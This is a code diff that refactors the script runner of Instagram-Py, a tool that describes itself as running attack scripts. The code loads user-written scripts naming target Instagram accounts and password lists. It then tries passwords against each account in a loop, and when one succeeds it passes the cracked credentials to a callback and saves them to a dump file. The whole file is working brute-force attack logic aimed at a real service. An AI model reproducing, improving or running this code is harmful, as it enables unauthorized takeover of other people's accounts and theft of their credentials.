@@ -1,5 +1,5 @@
 # The MIT License.
-# Copyright (C) 2017 The Future Shell , DeathSec.
+# Copyright (C) 2017 The Future Shell, DeathSec.
 #
 # @filename    : InstagramPyScript.py
 # @description : Handles Instagram-Py Attack Scripts.
@@ -13,108 +13,94 @@ from .AppInfo import appInfo as AppInformation
 
 
 class InstagramPyScript:
-    script_code = None
     cli = InstagramPyCLI(
         appinfo=AppInformation,
         started=datetime.now(),
         verbose_level=0,
         username=''
     )
-    threads = {}  # not actually threads but a simple dict
-    no_of_threads = len(threads)
+    threads = {}
 
     def __init__(self, script):
         self.cli.PrintHeader()
         self.cli.PrintDatetime()
 
         if not os.path.isfile(script):
-            self.cli.ReportError("no script found at {}".script)
+            self.cli.ReportError(f"no script found at {script}")
 
         with open(script, 'r') as f:
-            self.script_code = compile(f.read(), script, 'exec')
+            script_code = compile(f.read(), script, 'exec')
+            self.execute_script(script_code)
 
-    def run(self):
+    def execute_script(self, script_code):
         try:
-            exec(self.script_code, globals())
+            exec(script_code, globals())
             count = 0
             for i in usernames:
+                verbose_level = i.get('verbose', 0)
+                username = i['id']
+
+                cli = InstagramPyCLI(
+                    appinfo=AppInformation,
+                    started=datetime.now(),
+                    verbose_level=verbose_level,
+                    username=username
+                )
+
                 try:
-                    cli = InstagramPyCLI(
-                        appinfo=AppInformation,
-                        started=datetime.now(),
-                        verbose_level=i['verbose'],
-                        username=i['id']
-                    )
-                except:
-                    cli = InstagramPyCLI(
-                        appinfo=AppInformation,
-                        started=datetime.now(),
-                        verbose_level=0,
-                        username=i['id']
-                    )
-                try:
-                    session = InstagramPySession(
-                        i['id'],
-                        i['password_list'],
-                        DEFAULT_PATH,
-                        DEFAULT_PATH,
-                        cli
-                    )
-                except:
-                    try:
-                        session = InstagramPySession(
-                            i['id'],
-                            global_password_list,
-                            DEFAULT_PATH,
-                            DEFAULT_PATH,
-                            cli
-                        )
-                    except:
-                        self.cli.ReportError(
-                            "invalid script :: No Password list is Mentioned in the Script!")
+                    password_list = i['password_list']
+                except KeyError:
+                    password_list = global_password_list
+
+                session = InstagramPySession(
+                    username,
+                    password_list,
+                    DEFAULT_PATH,
+                    DEFAULT_PATH,
+                    cli
+                )
+
                 try:
                     session.ReadSaveFile(i['countinue'])
                 except:
                     session.ReadSaveFile(False)
 
                 instance = InstagramPyInstance(cli, session)
-
                 self.threads[count] = {
                     "terminated": False,
-                    "instance": instance
+                    "instance": instance,
+                    "callback": i.get('callback', global_callback)
                 }
-                try:
-                    self.threads[count]['callback'] = i['callback']
-                except:
-                    try:
-                        self.threads[count]['callback'] = global_callback
-                    except:
-                        self.threads[count]['callback'] = None
                 count += 1
         except Exception as e:
-            self.cli.ReportError("invalid script :: {}".format(e))
+            self.cli.ReportError(f"invalid script :: {e}")
 
-        # Finished Parsing the Custom Attack Script , Start The Attack.
+        # Finished Parsing the Custom Attack Script, Start The Attack.
         self.no_of_threads = len(self.threads)
-        while self.no_of_threads is not 0:
+        while self.no_of_threads:
             for i in self.threads:
-                if self.threads[i]['terminated'] is True:
-                    continue  # next iteration
+                if self.threads[i]['terminated']:
+                    continue
                 elif self.threads[i]['instance'].PasswordFound():
-                    if self.threads[i]['callback'] is not None:
-                        self.threads[i]['callback'](
-                            self.threads[i]['instance'].session.username,
-                            self.threads[i]['instance'].session.CurrentPassword()
-                        )
-                        self.threads[i]['instance'].session.WriteDumpFile(
-                            {
-                                "id": self.threads[i]['instance'].session.username,
-                                "password": self.threads[i]['instance'].session.CurrentPassword(),
-                                "started": str(self.threads[i]['instance'].cli.started)
-                            }
-                        )
-
-                    self.threads[i]['terminated'] = True
-                    self.no_of_threads -= 1
+                    self.handle_password_found(i)
                 else:
                     self.threads[i]['instance'].TryPassword()
+
+    def handle_password_found(self, i):
+        if self.threads[i]['callback']:
+            self.threads[i]['callback'](
+                self.threads[i]['instance'].session.username,
+                self.threads[i]['instance'].session.CurrentPassword()
+            )
+
+        self.threads[i]['instance'].session.WriteDumpFile(
+            {
+                "id": self.threads[i]['instance'].session.username,
+                "password": self.threads[i]['instance'].session.CurrentPassword(),
+                "started": str(self.threads[i]['instance'].cli.started)
+            }
+        )
+
+        self.threads[i]['terminated'] = True
+        self.no_of_threads -= 1
+
